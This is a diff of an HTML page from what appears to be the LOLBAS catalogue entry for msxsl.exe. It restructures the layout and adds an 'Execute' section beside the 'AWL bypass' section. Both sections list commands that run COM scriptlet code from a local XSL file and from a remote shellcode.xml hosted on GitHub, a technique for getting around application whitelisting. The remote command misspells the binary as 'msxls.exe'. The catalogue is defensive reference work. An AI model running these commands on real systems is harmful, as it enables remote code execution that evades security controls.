@@ -28,15 +28,22 @@
     </div>
 </h1>
 
-
 <ul class="function-list">
-    
-    
-    <li><a href="/lolbas/OtherMSBinaries/Msxsl/#awl bypass">AWL bypass</a></li>
-    
+	
+	
+	
+	<li><a href="/lolbas/OtherMSBinaries/Msxsl/#execute">Execute</a></li>
+	
+	
+	<li><a href="/lolbas/OtherMSBinaries/Msxsl/#awl bypass">AWL bypass</a></li>
+	
 </ul>
 
+	
+
 <p>Command line utility used to perform XSL transformations.</p>
+
+
 
 <br>
 <p><b>Paths:</b> 
@@ -48,76 +55,102 @@
 </p>
 <br>
 <b>Resources:</b> 	
-	<ul style="list-style-type:none">
+<br>
 	
-	<li><a href="https://twitter.com/subTee/status/877616321747271680">https://twitter.com/subTee/status/877616321747271680</a></li>
+	<a href="https://twitter.com/subTee/status/877616321747271680">https://twitter.com/subTee/status/877616321747271680</a>
+	<br>
 	
-	<li><a href="https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker">https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker</a></li>
+	<a href="https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker">https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker</a>
+	<br>
 	 
-	</ul>
 <br>
 <p><b>Acknowledgement:</b> 
-	<ul style="list-style-type:none">
+<br>
 	
-	<li>Casey Smith - <a href="https://twitter.com/@subtee">@subtee</a </li>
+	Casey Smith - <a href="https://twitter.com/@subtee">@subtee</a>
+	<br>
 	 
-	</ul>
 </p>
 <br>
-<p><b>Detection:</b> 
-	<ul style="list-style-type:none">
+<p><b>Detection:</b>
+<br>
 	
-	<li></li>
+	
+	<br>
 	 
-	</ul>
 </p>
 <br>
 <br>
 
 
 
-
-
-
-<h2 id="awl bypass" class="function-name">AWL bypass</h2>
-
-<p>The LOLBAS can bypass application whitelisting solutions.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Run COM Scriptlet code within the script.xsl file (local).</p>
-
+	
+<h2 id="execute" class ="function-name">Execute</h2>
+	
+		Run COM Scriptlet code within the script.xsl file (local).
+		<br>
+		<pre><code>msxsl.exe customers.xml script.xsl</code></pre>
 		Usecase:Local execution of script stored in XSL file.
-        <pre><code>msxsl.exe customers.xml script.xsl</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a></li>
-	<br><br>	
-    
-
-
-
-    <li>
-        <p>Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).</p>
-
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
+		Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
+		<br>
+		<pre><code>msxls.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml</code></pre>
 		Usecase:Local execution of remote script stored in XSL script stored as an XML file.
-        <pre><code>msxls.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a></li>
-	<br><br>	
-    
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
-</ul>
-<br><br>
+	
+<h2 id="awl bypass" class ="function-name">AWL bypass</h2>
+	
+		Run COM Scriptlet code within the script.xsl file (local).
+		<br>
+		<pre><code>msxsl.exe customers.xml script.xsl</code></pre>
+		Usecase:Local execution of script stored in XSL file.
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
+		Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
+		<br>
+		<pre><code>msxls.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml</code></pre>
+		Usecase:Local execution of remote script stored in XSL script stored as an XML file.
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
         <script>
          // add permalink on headings
